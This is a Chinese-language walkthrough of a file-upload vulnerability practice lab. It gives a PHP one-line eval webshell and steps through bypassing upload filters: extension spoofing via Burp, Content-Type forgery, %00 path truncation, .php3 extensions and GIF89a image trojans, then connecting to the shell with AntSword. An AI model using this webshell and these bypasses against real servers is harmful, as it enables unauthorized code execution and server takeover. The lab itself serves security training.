# 文件上传靶场通关之旅

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.39.45](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.39.45.png)

#### 练习所需：靶场、webshell、蚁剑/菜刀、Burpsuite

### 靶场下载

链接: [https://pan.baidu.com/s/1qvqZWLZ-c69oHupCCGuyEQ](https://pan.baidu.com/s/1qvqZWLZ-c69oHupCCGuyEQ)

密码: 4qhp

### webshell

一句话shell

```text
<?php eval(@$_POST['bjx']); ?>
```

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.41.56](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.41.56.png)

## 1、绕过前台脚本检测扩展名上传WebShell

* 直接上传，不允许

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.40.48](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.40.48.png)

* 我们把phpshell.php后缀改为phpshell.png
* 然后上传，burp拦截数据包，将拦截的数据再修改回来。

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.47.11](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.47.11.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.47.46](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.47.46.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.49.32](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.49.32.png)

* 修改完成后缀名，点击放包！

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.50.13](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.50.13.png)

* 上传成功

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.51.31](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.51.31.png)

* 打开保存地址 即 [http://192.168.0.104/upload/uploads/phpshell.php](http://192.168.0.104/upload/uploads/phpshell.php)
* 每个人安装包放的位置不同，此处位置有些变动。

  ![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.52.21](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.52.21.png)

* 使用蚁剑，连接webshell

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.54.03](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.54.03.png)

* 控制成功！

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.54.21](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.54.21.png)

* 第一关结束。

## 2、绕过Content-Type检测文件类型上传WebShell

* 我们先了解一下 Content-Type 
* [https://www.runoob.com/http/http-content-type.html](https://www.runoob.com/http/http-content-type.html)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.58.12](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.58.12.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;5.58.51](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%885.58.51.png)

* 这里呢，我们对照着对照表，把Content-Type修改为jpeg的格式

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.00.10](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.00.10.png)

* 打开burp和第二关，上传phpshell.php，截取数据包-并修改Content-Type值

原格式~

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.01.55](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.01.55.png)

修改后~

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.02.46](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.02.46.png)

* 修改完Content-Type，放包执行。

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.03.43](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.03.43.png)

* 上传成功，又可以进行webshell管理拿权限了。

## 3、绕过服务端目录路径检测上传Webshell

**PS：第一种方法这个靶场并没有涉及，第二种方法直接上传了**

* 目录路径检测，一般就检测路径是否合法
* 针对上面的检测方法可以通过00截断的方式来绕过
* 这里采用了白名单判断，但是$img\_path直接拼接，所以可以先上传一个符合白名单检测的jpg文件，之后再burpsuite中使用%00截断保存路径即可绕过检测，最后保存一个php类型的木马文件。
* 首先，上传一个shell.jpg格式的文件，之后使用burpsuite抓包：

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.41.23](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.41.23.png)

* 之后在save\_path处使用%00截断构造保存的文件名：

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.41.56](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.41.56.png)

* 上传第五关的图片马即可成功~~~

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.30.12](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.30.12.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.30.51](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.30.51.png)

* 蚁剑连接主要路径

## 4、绕过服务器端扩展名检测上传Webshell

* 我们使用phpshell.php直接上传肯定是不行的，而这一关又是拓展名，所以我们把shell名字改为phpshell.php3，即可成功上传

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.09.03](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.09.03.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.09.15](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.09.15.png)

* 为何要改为php3 ~ apache服务器能够使用php解析.phtml .php3 
* 蚁剑同样可以解析.php3

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.13.46](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.13.46.png)

## 5、构造图片马，绕过文件内容检测上传WebShell

* 主要内容 ~ GIF89a图片头文件欺骗

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.23.59](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.23.59.png)

* 构造图片马~文件名phpshell.php

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.24.52](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.24.52.png)

* 上传成功

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.28.16](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.28.16.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.28.28](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.28.28.png)

* 蚁剑连接~成功！

## 6、文件上传漏洞演示脚本--中国菜刀连接一句话木马

* 第六关就是简单的一句话木马直接上传即可。

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.16.27](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.16.27.png)

![&#x622A;&#x5C4F;2020-08-27 &#x4E0B;&#x5348;6.15.59](https://gitee.com/Harveysn0w/mac-note_img/raw/master/%E6%88%AA%E5%B1%8F2020-08-27%20%E4%B8%8B%E5%8D%886.16.10.png)

### 结束~~~

